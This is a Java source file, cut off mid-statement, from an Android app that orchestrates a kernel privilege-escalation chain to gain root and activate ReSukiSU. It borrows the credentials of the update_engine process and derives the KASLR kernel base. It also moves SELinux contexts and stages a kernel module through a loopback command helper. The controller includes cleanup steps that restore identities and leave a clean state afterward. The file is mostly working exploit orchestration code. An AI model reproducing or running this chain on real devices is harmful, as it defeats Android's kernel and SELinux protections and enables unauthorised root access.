package com.vandam.prism;

import android.content.Context;
import android.os.Process;
import android.system.Os;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/** Fixed external controller for the qualified direct ReSukiSU activation path. */
final class DirectReSukiSuActivation {
    interface Reporter {
        void phase(String value, String message);
        void log(String message);
    }

    static final class Result {
        final String status;
        final String phase;
        final boolean unsafe;
        final String message;

        Result(String status, String phase, boolean unsafe, String message) {
            this.status = status;
            this.phase = phase;
            this.unsafe = unsafe;
            this.message = message;
        }
    }

    private static final String PACKAGE = "com.vandam.prism";
    private static final String HELPER_CLASS = "com.vandam.prism.ShellBridgeMain";
    private static final String HELPER_LOG =
            "/data/local/tmp/light-side-of-the-moon-helper.log";
    private static final String SU_TOKEN = "/data/local/tmp/light-side-su.token";
    private static final String SU_ARM = "/data/local/tmp/light-side-su.arm";
    private static final String ROOT_WATCHDOG_ARM =
            "/data/local/tmp/light-side-root-watchdog.arm";
    private static final String NORMALISE_WAITING =
            "/data/local/tmp/light-side-normalise.waiting";
    private static final String CONTROLLER_WATCHDOG_PID =
            "/data/local/tmp/prism-controller-watchdog.pid";
    private static final String CONTROLLER_JOURNAL =
            "/data/local/tmp/prism-controller-journal";
    private static final String CONTROLLER_TRACE =
            "/data/local/tmp/prism-controller.trace";
    private static final String ARM_HOLDER_PID =
            "/data/local/tmp/prism-arm-holder.pid";
    private static final int COMMAND_PORT = 47393;
    private static final long KERNEL_LINK_BASE = 0xffffffc008000000L;
    private static final long KASLR_ALIGNMENT = 0x200000L;
    private static final long RUN_TIMEOUT_MILLIS = 20 * 60 * 1000L;
    private static final int SOCKET_OUTPUT_LIMIT = 16 * 1024 * 1024;
    private static final Set<String> NAMESPACE_NAMES = new HashSet<>(Arrays.asList(
            "cgroup", "mnt", "net", "time", "time_for_children", "uts"));
    private static final String[] RESUME_FIELDS = {
            "resume_magic", "resume_version", "resume_size",
            "resume_cookie_hi", "resume_cookie_lo", "resume_helper_task",
            "resume_helper_pid", "resume_donor_task", "resume_donor_tgid",
            "resume_signal", "resume_before_state", "resume_before_exit_state",
            "resume_before_threads", "resume_before_stopped",
            "resume_after_state", "resume_after_exit_state",
            "resume_after_threads", "resume_after_stopped",
            "resume_stable_samples", "resume_task_security",
            "resume_task_security_word8", "resume_inode_security",
            "resume_inode_security_word8", "resume_labels_restored",
            "resume_resumed", "resume_proof", "resume_commit"
    };

    private final Context context;
    private final String session;
    private final int managerUid;
    private final Reporter reporter;
    private final SecureRandom random = new SecureRandom();

    private PrismAppBridgeClient app;
    private java.lang.Process armHolder;
    private int armHolderPid;
    private String armHolderStart = "";
    private java.lang.Process helperProcess;
    private java.lang.Process controllerWatchdog;
    private OutputStream controllerWatchdogLease;
    private Socket socket;
    private BufferedInputStream socketInput;
    private OutputStream socketOutput;
    private String bootId;
    private String bridgeNonce;
    private String commandToken;
    private ProcIdentity donor;
    private ProcIdentity ueventd;
    private ProcIdentity helperBaseline;
    private int helperPid;
    private String helperStart;
    private String helperCommandLine;
    private int controllerWatchdogPid;
    private String controllerWatchdogStart;
    private String controllerWatchdogDisarmToken;
    private int watchdogTid;
    private Set<Integer> helperTidsBeforeRoot = Collections.emptySet();
    private boolean harnessStarted;
    private boolean harnessDispatchAttempted;
    private boolean mutationObserved;
    private boolean cleanupClaimedClean;
    private boolean helperRetired;
    private boolean safeRecoveryProven;
    private boolean processTeardownRequested;
    private boolean preMutationResetRequested;
    private boolean safeResetDurable;
    private boolean safeResetCompleted;
    private SafeResetRecord safeResetRecord;
    private Map<Integer, String> rootChainCohort = Collections.emptyMap();
    private String processTeardownResult = "";
    private String processTeardownProgress = "";
    private String processTeardownToken = "";
    private ActivationProofs.NormalisationProof terminalNormalisationProof;
    private DonorSample terminalDonorSample;
    private String normalisationProofDigest = "";
    private String strictCleanProofDigest = "";
    private String strictCleanReceipt = "";
    private String lastProgress = "";
    private int reportedProgressLines;

    DirectReSukiSuActivation(
            Context context,
            String session,
            int managerUid,
            Reporter reporter) {
        this.context = context;
        this.session = session;
        this.managerUid = managerUid;
        this.reporter = reporter;
    }

    Result run() {
        try {
            prepare();
            controllerTrace("prepare-pass");
            executeChain();
            controllerTrace("chain-pass");
            strictPostflight();
            controllerTrace("postflight-pass");
            requirePass(app.closeSession(), "app-bridge-close", false);
            controllerTrace("app-bridge-close-pass");
            disarmControllerWatchdog();
            controllerTrace("controller-watchdog-disarm-pass");
            controllerTrace("activation-result status=pass phase=complete unsafe=0");
            controllerTrace("activation-pass");
            return new Result(
                    "pass", "complete", false,
                    "ReSukiSU activation and terminal cleanup passed");
        } catch (ActivationFailure failure) {
            controllerTrace("activation-failure phase=" + failure.phase +
                    " process_teardown=" + (processTeardownRequested ? 1 : 0));
            if (processTeardownRequested) {
                try {
                    controllerTrace("process-teardown-enter");
                    performSameBootProcessTeardown();
                    safeRecoveryProven = true;
                    controllerTrace("process-teardown-pass");
                } catch (Exception exception) {
                    controllerTrace("process-teardown-fail type=" +
                            exception.getClass().getSimpleName());
                    reporter.log(
                            "Same-boot teardown failed: " +
                                    exception.getClass().getSimpleName());
                    safeRecoveryProven = false;
                }
            } else if (preMutationResetRequested) {
                try {
                    performVerifiedPreMutationReset();
                    safeRecoveryProven = safeResetCompleted;
                } catch (Exception exception) {
                    reporter.log(
                            "Pre-mutation reset failed: " +
                                    exception.getClass().getSimpleName());
                    safeRecoveryProven = safeResetCompleted;
                }
            }
            if (preMutationResetRequested && safeResetDurable) {
                reporter.log(failure.getMessage());
                controllerTrace("activation-result status=fail phase=" +
                        (safeResetCompleted
                                ? "safe-reset-complete"
                                : "safe-reset-pending") + " unsafe=0");
                return new Result(
                        "fail",
                        safeResetCompleted
                                ? "safe-reset-complete"
                                : "safe-reset-pending",
                        false,
                        safeResetCompleted
                                ? "The no-mutation reset passed; tap Root to retry"
                                : "The no-mutation proof is safe and process cleanup remains pending");
            }
            if (processTeardownRequested && safeRecoveryProven) {
                reporter.log(failure.getMessage());
                recover(false);
                controllerTrace(
                        "activation-result status=retry phase=same-boot-retry unsafe=0");
                return new Result(
                        "retry", "same-boot-retry", false,
                        "The same-boot reset passed and activation can retry");
            }
            boolean unsafe = failure.unsafe ||
                    (harnessDispatchAttempted && !cleanupClaimedClean &&
                            !safeRecoveryProven);
            reporter.log(failure.getMessage());
            recover(unsafe);
            controllerTrace("activation-result status=fail phase=" +
                    failure.phase + " unsafe=" + (unsafe ? 1 : 0));
            return new Result(
                    "fail", failure.phase, unsafe,
                    unsafe
                            ? "Activation could not prove a clean state; a safety reboot was requested"
                            : failure.getMessage());
        } catch (Exception exception) {
            controllerTrace("controller-exception type=" +
                    exception.getClass().getSimpleName() + " message=" +
                    traceToken(exception.getMessage()));
            if (safeResetDurable) {
                reporter.log("Safe reset remains pending: " +
                        exception.getClass().getSimpleName());
                controllerTrace(
                        "activation-result status=fail phase=safe-reset-pending unsafe=0");
                return new Result(
                        "fail", "safe-reset-pending", false,
                        "The no-mutation proof is safe and process cleanup remains pending");
            }
            boolean unsafe = harnessDispatchAttempted &&
                    !cleanupClaimedClean && !safeRecoveryProven;
            reporter.log("Controller error: " + exception.getClass().getSimpleName());
            recover(unsafe);
            controllerTrace("activation-result status=fail phase=controller-error unsafe=" +
                    (unsafe ? 1 : 0));
            return new Result(
                    "fail", "controller-error", unsafe,
                    unsafe
                            ? "Activation could not prove a clean state; a safety reboot was requested"
                            : "Activation stopped before an unsafe mutation");
        } finally {
            closeTransport();
            if (safeResetDurable) {
                releaseControllerWatchdogForSafeReset();
            }
            if (!safeResetDurable || safeResetCompleted) {
                stopArmHolder();
            }
            if (app != null) {
                app.close();
            }
            if (!safeResetDurable || safeResetCompleted) {
                removeShellControlFiles();
            }
            controllerTrace("controller-finally-pass");
        }
    }

    private void prepare() throws Exception {
        reporter.phase("activation-preflight", "Preparing the guarded activation controller");
        bootId = readText("/proc/sys/kernel/random/boot_id", 128).trim();
        require(bootId.matches("[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-" +
                "[0-9a-f]{4}-[0-9a-f]{12}"), "boot-id", false,
                "The boot identity is invalid");
        String trace = readTextIfPresent(CONTROLLER_TRACE, 2 * 1024 * 1024);
        String binding = "boot_id=" + bootId + " session=" + session;
        if (!trace.contains(binding)) {
            Files.deleteIfExists(Path.of(CONTROLLER_TRACE));
        }
        controllerTrace("controller-start " + binding);
        int registeredJobs = registeredJobCount();
        require(registeredJobs < 1000, "jobs-preflight", false,
                "The registered JobScheduler count is unsafe");
        reporter.log("Registered system jobs before activation: " +
                registeredJobs);
        requireNormalDeviceHealth("health-preflight", false);
        reporter.log("Device health before activation verified");
        recoverStaleControllerResidue();

        donor = waitForStableProcess(
                "update_engine", "update_engine", "u:r:update_engine:s0", 0, 22);
        reporter.log("Kernel donor process verified");
        ueventd = requireProcess(
                "ueventd", "ueventd", "u:r:ueventd:s0", 0, 16);
        require("0".equals(ueventd.field("Seccomp")), "ueventd-gate", false,
                "ueventd seccomp state changed");
        String vendorLabel = fixedCommand("/system/bin/ls", "-Zd", "/vendor")
                .trim().split("\\s+", 2)[0];
        require("u:object_r:vendor_file:s0".equals(vendorLabel),
                "vendor-gate", false, "The /vendor label changed");
        require(!moduleVisible(), "rescue-module-gate", false,
                "The ctlbuf rescue module is already live");

        bridgeNonce = randomHex(16);
        commandToken = randomHex(32);
        app = PrismAppBridgeClient.connect(context, session, bootId);
        requirePass(app.openSession(), "app-bridge-open", false);

        prepareShellControlFiles();
        startArmHolder();
        startHelper();
        startControllerWatchdog();
        rootChainCohort = stablePrismAppCohort();
        startHarness();
    }

    private void executeChain() throws Exception {
        reporter.phase("acquisition", "Running the kernel acquisition chain");
        long deadline = elapsed() + RUN_TIMEOUT_MILLIS;
        boolean commandReady = false;
        boolean writeArmed = false;
        boolean watchdogArmed = false;
        boolean rootActionComplete = false;

        while (elapsed() < deadline) {
            String progress = readApp(PrismAppBridgeService.SIGNAL_PROGRESS);
            if (!progress.isEmpty()) {
                observeProgress(progress);
            }
            String result = readApp(PrismAppBridgeService.SIGNAL_RESULT);
            if (result.startsWith("status=") && !rootActionComplete) {
                String token = readApp(
                        PrismAppBridgeService.SIGNAL_PROC_TEARDOWN_TOKEN);
                ActivationProofs.InitialAcquisitionMissProof proof =
                        ActivationProofs.parseInitialAcquisitionMiss(
                                result, progress, token);
                boolean safeMiss = isSafeMiss(progress, result);
                controllerTrace("chain-result-observed result_sha256=" +
                        sha256(result) + " result_bytes=" +
                        result.getBytes(StandardCharsets.UTF_8).length +
                        " progress_sha256=" + sha256(progress) +
                        " progress_bytes=" +
                        progress.getBytes(StandardCharsets.UTF_8).length +
                        " initial_miss=" + (proof != null ? 1 : 0) +
                        " safe_miss=" + (safeMiss ? 1 : 0));
                if (proof != null) {
                    controllerTrace("process-teardown-proof-parsed");
                    require(proof.bindsTo(
                                    bridgeNonce, bootId, helperPid, helperStart),
                            "process-teardown-token", true,
                            "The process teardown token is invalid");
                    String teardownArm = app.validateProcessTeardown(token);
                    controllerTrace("process-teardown-arm-result response=[" +
                            teardownArm + "]");
                    requirePass(
                            teardownArm,
                            "process-teardown-arm",
                            true);
                    controllerTrace("process-teardown-proof-armed");
                    processTeardownRequested = true;
                    processTeardownResult = result;
                    processTeardownProgress = progress;
                    processTeardownToken = token;
                    throw new ActivationFailure(
                            "initial-acquisition-miss", false,
                            "The acquisition missed and requested a same-boot reset");
                }
                if (safeMiss) {
                    preMutationResetRequested = true;
                    persistSafeMissProof(result, progress);
                    throw new ActivationFailure(
                            "safe-acquisition-miss", false,
                            "The acquisition missed safely; retry without reboot");
                }
                throw new ActivationFailure(
                        "chain-before-root-window", mutationObserved,
                        "The chain stopped before the root window");
            }

            if (!commandReady && privateCredentialRequestReady(progress)) {
                establishCommandTransport();
                commandReady = true;
            }
            if (commandReady && !writeArmed &&
                    progress.contains(" root-write-arm-ready")) {
                writeGate(PrismAppBridgeService.GATE_ROOT_WRITE_ARM, "");
                writeArmed = true;
                reporter.log("Root write arm released");
            }
            if (commandReady && !watchdogArmed &&
                    progress.contains(" root-watchdog-arm-ready")) {
                armRootWatchdog();
                watchdogArmed = true;
            }
            if (watchdogArmed && !rootActionComplete &&
                    progress.contains(" root-window-ready")) {
                performRootAction();
                rootActionComplete = true;
                break;
            }
            Thread.sleep(40);
        }
        require(rootActionComplete, "root-window-timeout", mutationObserved,
                "The root window did not arrive before timeout");
    }

    private void establishCommandTransport() throws Exception {
        reporter.phase("private-credential", "Binding the private shell credential");
        String expectedRequest = "nonce=" + bridgeNonce +
                " helper_pid=" + helperPid +
                " helper_start_time=" + helperStart +
                " main_tid=" + helperPid +
                " boot_id=" + bootId;
        String request = readApp(PrismAppBridgeService.SIGNAL_PRIVATE_CREDENTIAL);
        require(expectedRequest.equals(request), "private-credential-request", false,
                "The private credential request binding changed");
        requireHelperIdentity(false);

        String helperLog = readHelperLog();
        require(!linePresent(helperLog,
                        "BRIDGE_COMMAND_ARMED nonce=" + bridgeNonce),
                "command-arm", false, "The helper armed before controller release");
        stopArmHolder();
        waitForHelperLine(
                "BRIDGE_COMMAND_ARMED nonce=" + bridgeNonce, 10_000);
        waitForHelperLine(
                "BRIDGE_COMMAND_LISTENING nonce=" + bridgeNonce, 10_000);

        socket = new Socket();
        socket.connect(new InetSocketAddress(
                InetAddress.getLoopbackAddress(), COMMAND_PORT), 10_000);
        socket.setSoTimeout(100_000);
        socketInput = new BufferedInputStream(socket.getInputStream());
        socketOutput = socket.getOutputStream();
        byte[] command = ("__LP3_RESUKISU_ACTIVATE__:" + managerUid)
                .getBytes(StandardCharsets.UTF_8);
        socketOutput.write(commandToken.getBytes(StandardCharsets.US_ASCII));
        socketOutput.write('\n');
        socketOutput.write(ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN)
                .putInt(command.length).array());
        socketOutput.write(command);
        socketOutput.flush();
        String ack = readSocketLine(512);
        require(("LP3_SU_AUTH_" + commandToken + "=1").equals(ack),
                "command-auth", false, "The command helper authentication failed");

        String waiting = "BRIDGE_COMMAND_PRIVATE_CREDENTIAL_WAITING nonce=" +
                bridgeNonce + " pid=" + helperPid + " start=" + helperStart +
                " tid=" + helperPid + " boot_id=" + bootId;
        waitForHelperLine(waiting, 10_000);
        String privatePrefix = "BRIDGE_COMMAND_PRIVATE_CREDENTIAL nonce=" +
                bridgeNonce + " state=[";
        String privateLine = waitForHelperPrefix(privatePrefix, 10_000);
        String expectedPrivate = privatePrefix +
                "status=pass stage=private-shell-credential leader=1 pid=" +
                helperPid + " tid=" + helperPid +
                " securebits_before=47 securebits_before_errno=0 ambient_cap=0" +
                " ambient_before=0 ambient_before_errno=0 ambient_lower=0" +
                " ambient_lower_errno=0 private_credential=0" +
                " private_credential_errno=0 ambient_after=0" +
                " ambient_after_errno=0 securebits_after=47" +
                " securebits_after_errno=0 shell_before=1 shell_after=1]";
        require(expectedPrivate.equals(privateLine), "private-credential-proof", false,
                "The private shell credential proof changed");
        waitForHelperLine(
                "BRIDGE_COMMAND_BUFFERED nonce=" + bridgeNonce, 10_000);

        helperBaseline = readProc(helperPid);
        helperTidsBeforeRoot = taskIds(helperPid);
        require(helperTidsBeforeRoot.size() >= 3 &&
                        helperTidsBeforeRoot.contains(helperPid) &&
                        helperBaseline.idsEqual("Uid", 2000) &&
                        helperBaseline.idsEqual("Gid", 2000) &&
                        "u:r:shell:s0".equals(helperBaseline.context) &&
                        NAMESPACE_NAMES.equals(helperBaseline.namespaces.keySet()) &&
                        helperBaseline.namespaces.values().stream()
                                .allMatch(value -> !value.isEmpty()),
                "private-shell-baseline", false,
                "The private shell baseline is invalid");
        requireHelperIdentity(false);

        String gate = "nonce=" + bridgeNonce +
                " helper_pid=" + helperPid +
                " helper_start_time=" + helperStart +
                " main_tid=" + helperPid +
                " boot_id=" + bootId +
                " host_helper_identity=1";
        writeGate(PrismAppBridgeService.GATE_PRIVATE_CREDENTIAL_ARM, gate);
        reporter.log("Private shell credential verified");
    }

    private void armRootWatchdog() throws Exception {
        reporter.phase("root-watchdog", "Arming the root watchdog");
        require(socketOutput != null, "root-watchdog-transport", mutationObserved,
                "The watchdog transport is unavailable");
        socketOutput.write(4);
        socketOutput.flush();
        String prefix = "BRIDGE_COMMAND_ROOT_WATCHDOG_READY nonce=" +
                bridgeNonce + " tid=";
        String line = waitForHelperPrefix(prefix, 45_000);
        Pattern pattern = Pattern.compile(Pattern.quote(prefix) +
                "([1-9][0-9]*) identity=\\[status=pass stage=" +
                "command-root-watchdog pid=" + helperPid +
                " tid=([1-9][0-9]*) uid=0,0,0 gid=0,0,0 fsuid=0 fsgid=0" +
                " cap_eff=([0-9a-f]{16})\\]");
        Matcher match = pattern.matcher(line);
        require(match.matches(), "root-watchdog-proof", true,
                "The watchdog proof is malformed");
        watchdogTid = Integer.parseInt(match.group(1));
        require(watchdogTid == Integer.parseInt(match.group(2)) &&
                        match.group(3).equals(donor.capEff16()),
                "root-watchdog-proof", true,
                "The watchdog identity does not match the donor");

        ProcIdentity watchdog = readProcTask(helperPid, watchdogTid);
        Set<Integer> currentTids = taskIds(helperPid);
        Set<Integer> expectedTids = new HashSet<>(helperTidsBeforeRoot);
        expectedTids.add(watchdogTid);
        require(Integer.toString(helperPid).equals(watchdog.field("Tgid")) &&
                        watchdog.idsEqual("Uid", 0) && watchdog.idsEqual("Gid", 0) &&
                        donor.field("CapEff").equals(watchdog.field("CapEff")) &&
                        donor.context.equals(watchdog.context) &&
                        currentTids.equals(expectedTids) &&
                        donor.isSameProcess() && helperIsSameProcess() && sameBoot(),
                "root-watchdog-host-gate", true,
                "The external watchdog identity gate failed");
        String gate = watchdogGate();
        writeGate(PrismAppBridgeService.GATE_ROOT_WATCHDOG_ARM, gate);
        reporter.log("Root watchdog identity verified");
    }

    private void performRootAction() throws Exception {
        reporter.phase("root-action", "Activating ReSukiSU in the guarded root window");
        validateRootWindow(donor.context);
        socketOutput.write(2);
        socketOutput.flush();
        Frame initial = readFrame("LP3_SU_EXIT_" + commandToken + "=", 1_048_576);
        require("0".equals(initial.terminalValue), "root-command", true,
                "The initial root command failed");
        String expectedIdentity = "LP3_SU_IDENTITY status=pass " +
                "stage=command-root-watchdog pid=" + helperPid +
                " tid=" + watchdogTid + " uid=0,0,0 gid=0,0,0" +
                " fsuid=0 fsgid=0 cap_eff=" + donor.capEff16();
        require(initial.lines.contains(expectedIdentity) &&
                        initial.lines.contains(
                                "LP3_RESUKISU status=ready " +
                                "stage=resukisu-action action=activate"),
                "root-command-proof", true,
                "The initial ReSukiSU command proof changed");

        String stagePlan = waitForAppSignal(
                PrismAppBridgeService.SIGNAL_RESUKISU_STAGE_PLAN,
                "status=pass stage=resukisu-stage-plan ", 10_000);
        Pattern stagePattern = Pattern.compile(
                "status=pass stage=resukisu-stage-plan nonce=" + bridgeNonce +
                " kernel_base=0x([0-9a-f]+) kaslr_slide=0x([0-9a-f]+)");
        Matcher stageMatch = stagePattern.matcher(stagePlan);
        require(stageMatch.matches(), "resukisu-stage-plan", true,
                "The ReSukiSU stage plan is invalid");
        long kernelBase = Long.parseUnsignedLong(stageMatch.group(1), 16);
        long kaslrSlide = Long.parseUnsignedLong(stageMatch.group(2), 16);
        require(Long.compareUnsigned(kernelBase, KERNEL_LINK_BASE) >= 0 &&
                        (kernelBase & (KASLR_ALIGNMENT - 1)) == 0 &&
                        kernelBase - KERNEL_LINK_BASE == kaslrSlide &&
                        (kaslrSlide & (KASLR_ALIGNMENT - 1)) == 0,
                "resukisu-kernel-base", true,
                "The ReSukiSU kernel base is invalid");
        socketOutput.write(8);
        socketOutput.write(ByteBuffer.allocate(8).order(ByteOrder.BIG_ENDIAN)
                .putLong(kernelBase).array());
        socketOutput.flush();
        Frame stage = readFrame("LP3_SU_STAGE_" + commandToken + "=", 65_536);
        String expectedStage = "LP3_RESUKISU_STAGE status=pass " +
                "stage=resukisu-stage result=0 relocation=0 kernel_base=0x" +
                Long.toUnsignedString(kernelBase, 16) + " kaslr_slide=0x" +
                Long.toUnsignedString(kaslrSlide, 16);
        require("0".equals(stage.terminalValue) &&
                        stage.lines.size() == 1 && expectedStage.equals(stage.lines.get(0)),
                "resukisu-stage", true, "ReSukiSU staging failed");
        reporter.log("ReSukiSU module staged for the exact kernel base");

        waitForShellFile(
                NORMALISE_WAITING,
                "nonce=" + bridgeNonce + " pid=" + helperPid + " tid=" + helperPid,
                10_000);
        writeGate(PrismAppBridgeService.GATE_ROOT_ACTION_DONE, "");

        socketOutput.write(5);
        socketOutput.flush();
        waitForHelperLine(
                "BRIDGE_COMMAND_CTLBUF_DONOR_SIGNALLED nonce=" + bridgeNonce +
                        " pid=" + donor.pid,
                15_000);
        require(stableDonorTasks(true, 15_000) != null,
                "donor-stop-gate", true,
                "The donor did not reach a stable stopped state");
        socketOutput.write(6);
        socketOutput.flush();
        waitForHelperLine(
                "BRIDGE_COMMAND_CTLBUF_DONOR_FROZEN nonce=" + bridgeNonce +
                        " pid=" + donor.pid,
                15_000);
        String frozenGate = "nonce=" + bridgeNonce +
                " donor_pid=" + donor.pid +
                " donor_start_time=" + donor.startTime +
                " boot_id=" + bootId + " host_donor_frozen=1";
        writeGate(PrismAppBridgeService.GATE_CTLBUF_DONOR_FROZEN, frozenGate);

        waitForProgress("root-window-security-ready", 90_000);
        validateRootWindow("u:r:ueventd:s0");
        socketOutput.write(7);
        socketOutput.flush();
        Frame finalAction = readFrame(
                "LP3_SU_FINAL_" + commandToken + "=", 1_048_576);
        require("0".equals(finalAction.terminalValue) &&
                        finalAction.lines.size() == 1 &&
                        ("LP3_RESUKISU status=pass stage=resukisu-action " +
                                "action=activate exit=0 errno=0")
                                .equals(finalAction.lines.get(0)),
                "resukisu-activate", true,
                "The final ReSukiSU action proof failed");
        writeGate(PrismAppBridgeService.GATE_ROOT_ACTION_SECURITY, watchdogGate());
        reporter.log("ReSukiSU activation returned success");

        normaliseAndRetire(kernelBase);
        waitForStrictTerminalCleanup();
    }

    private void normaliseAndRetire(long kernelBase) throws Exception {
        reporter.phase("normalisation", "Restoring the helper and donor identities");
        waitForProgress("helper-normalisation-arm-ready", 90_000);
        String rescuePlan = waitForAppSignal(
                PrismAppBridgeService.SIGNAL_CTLBUF_RESCUE_PLAN,
                "status=pass stage=ctlbuf-rescue-plan ", 10_000);
        String rescuePrefix = "status=pass stage=ctlbuf-rescue-plan nonce=" +
                bridgeNonce + " module_sha256=" +
                "2b4e520b65f252c1c7a51c303f8bc228663f6804cbca00f2ebc6005c9a9f26f8" +
                " params=";
        require(rescuePlan.startsWith(rescuePrefix) &&
                        rescuePlan.length() <= 3072 &&
                        rescuePlan.contains(" kernel_base=0x" +
                                Long.toUnsignedString(kernelBase, 16) + " "),
                "ctlbuf-rescue-plan", true,
                "The ctlbuf rescue plan is invalid");
        byte[] rescueBytes = rescuePlan.getBytes(StandardCharsets.UTF_8);
        socketOutput.write(3);
        socketOutput.write(ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN)
                .putInt(rescueBytes.length).array());
        socketOutput.write(rescueBytes);
        socketOutput.flush();

        String normalisedPrefix = "BRIDGE_COMMAND_NORMALISED nonce=" +
                bridgeNonce + " state=[";
        String normalisedLine = waitForHelperPrefix(normalisedPrefix, 60_000);
        String finalisePrefix = "BRIDGE_COMMAND_CTLBUF_FINALISED nonce=" +
                bridgeNonce + " state=[";
        String finaliseLine = uniqueHelperPrefix(finalisePrefix);
        String resumePrefix = "BRIDGE_COMMAND_CTLBUF_DONOR_RESUME_STATE nonce=" +
                bridgeNonce + " state=[";
        String resumeLine = uniqueHelperPrefix(resumePrefix);
        require(finaliseLine.endsWith("]") && resumeLine.endsWith("]") &&
                        normalisedLine.endsWith("]"),
                "normalisation-proof", true,
                "A terminal normalisation proof is truncated");

        String finalise = unwrap(finaliseLine, finalisePrefix);
        String resume = unwrap(resumeLine, resumePrefix);
        String normalised = unwrap(normalisedLine, normalisedPrefix);
        ActivationProofs.CtlbufFinaliseProof finaliseProof =
                ActivationProofs.parseCtlbufFinalise(finalise);
        require(finaliseProof != null && finaliseProof.bindsTo(helperPid, donor.pid),
                "ctlbuf-finalise-proof", true,
                "The ctlbuf finalisation proof is invalid");
        ActivationProofs.DonorResumeProof resumeProof =
                ActivationProofs.parseDonorResume(resume);
        require(resumeProof != null && resumeProof.bindsTo(
                        bridgeNonce, helperPid, donor.pid, finaliseProof),
                "donor-resume-proof", true,
                "The donor resume proof is invalid");
        terminalNormalisationProof = ActivationProofs.parseNormalisation(normalised);
        require(terminalNormalisationProof != null &&
                        terminalNormalisationProof.bindsTo(
                                watchdogTid, helperPid, donor.pid, resumeProof),
                "normalisation-proof", true,
                "The credential normalisation proof is invalid");
        normalisationProofDigest = sha256(
                "ctlbuf=" + finalise + "\nresume=" + resume +
                        "\nnormalisation=" + normalised);
        require(normalisationProofDigest.matches("[0-9a-f]{64}"),
                "normalisation-digest", true,
                "The normalisation proof digest could not be recorded");

        DonorSample resumed = stableDonorTasks(false, 5_000);
        require(resumed != null, "donor-resume-host-gate", true,
                "The donor did not resume with a stable identity");
        validateFinalShellIdentity();
        terminalDonorSample = resumed;
        String hostGate = buildTerminalHostGate(
                terminalNormalisationProof, resumed, false);
        writeGate(PrismAppBridgeService.GATE_CTLBUF_FINALISE, finalise);
        writeGate(PrismAppBridgeService.GATE_HELPER_NORMALISED, hostGate);

        waitForProgress("helper-retirement-arm-ready", 30_000);
        socketOutput.write(1);
        socketOutput.flush();
        closeTransport();
        long exitDeadline = elapsed() + 15_000;
        while (elapsed() < exitDeadline && !processStartTime(helperPid).isEmpty()) {
            Thread.sleep(25);
        }
        require(processStartTime(helperPid).isEmpty(), "helper-retirement", true,
                "The activation helper did not retire");
        helperRetired = true;
        writeGate(
                PrismAppBridgeService.GATE_HELPER_RETIRED,
                buildTerminalHostGate(
                        terminalNormalisationProof, resumed, true));
        reporter.log("Helper normalisation and retirement verified");
    }

    private void waitForStrictTerminalCleanup() throws Exception {
        reporter.phase("terminal-cleanup", "Waiting for strict terminal cleanup");
        long deadline = elapsed() + 180_000;
        String cleanup = "";
        while (elapsed() < deadline) {
            require(sameBoot(), "terminal-cleanup-boot", true,
                    "The boot identity changed during terminal cleanup");
            String donorRetirement = readApp(
                    PrismAppBridgeService.SIGNAL_DONOR_RETIREMENT);
            if (donorRetirement.startsWith("status=fail")) {
                throw new ActivationFailure(
                        "terminal-donor-retirement", true,
                        "The donor retirement proof failed");
            }
            cleanup = readApp(PrismAppBridgeService.SIGNAL_TERMINAL_CLEANUP);
            if (cleanup.startsWith("status=")) {
                break;
            }
            Thread.sleep(50);
        }
        ActivationProofs.TerminalCleanupProof cleanupProof =
                ActivationProofs.parseTerminalCleanup(cleanup);
        require(cleanupProof != null && terminalDonorSample != null &&
                        cleanupProof.bindsTo(
                                helperPid,
                                donor.pid,
                                donor.startTime,
                                terminalDonorSample.tids,
                                terminalDonorSample.states,
                                terminalNormalisationProof),
                "terminal-cleanup-proof", true,
                "Strict terminal cleanup did not produce an exact clean proof");
        String credentialDeath = readApp(
                PrismAppBridgeService.SIGNAL_CREDENTIAL_TARGET_DEATH);
        ActivationProofs.CredentialTargetDeathProof credentialDeathProof =
                ActivationProofs.parseCredentialTargetDeath(credentialDeath);
        require(credentialDeathProof != null && credentialDeathProof.bindsTo(
                        helperPid, helperStart, bootId),
                "credential-target-death", true,
                "The helper credential death proof is missing");

        String result = waitForAppSignal(
                PrismAppBridgeService.SIGNAL_RESULT, "status=", 60_000);
        require(result.startsWith("status=pass stage=root-chain ") &&
                        result.contains("terminal_cleanup=[status=pass " +
                                "stage=terminal-cleanup outcome=clean "),
                "root-chain-result", false,
                "The root chain did not accept the cleanup proof");
        strictCleanProofDigest = sha256(
                "normalisation_sha256=" + normalisationProofDigest +
                        "\ncleanup=" + cleanup +
                        "\ncredential_death=" + credentialDeath +
                        "\nroot_result=" + result);
        require(strictCleanProofDigest.matches("[0-9a-f]{64}"),
                "strict-clean-digest", true,
                "The strict cleanup proof digest could not be recorded");
        cleanupClaimedClean = true;
        reporter.log("Strict terminal cleanup passed");
    }

    private void strictPostflight() throws Exception {
        boolean passed = false;
        try {
            reporter.phase("postflight", "Verifying the clean same-boot result");
            long dwellStarted = elapsed();
            requireExactPostflightBaseline("postflight-identity");
            Thread.sleep(10_000);
            requireExactPostflightBaseline("postflight-dwell");
            CommandResult version = runCommand(
                    "/data/local/tmp/lp3-resukisu-ksud", "debug", "version");
            require(version.exit == 0 &&
                            "Kernel Version: 35088".equals(version.output.trim()),
                    "resukisu-active-proof", true,
                    "ReSukiSU did not remain active after cleanup");
            long dwellMillis = elapsed() - dwellStarted;
            require(dwellMillis >= 10_000,
                    "postflight-dwell-duration", true,
                    "The strict postflight dwell was too short");
            int jobs = registeredJobCount();
            require(jobs < 1000, "postflight-jobs", true,
                    "The postflight JobScheduler count is unsafe");
            reporter.log("ReSukiSU active version 35088 verified");
            reporter.log("Registered system jobs after activation: " +
                    jobs);
            reporter.log("Device health after activation verified");
            strictCleanReceipt =
                    "version=1 kind=strict-clean session=" + session +
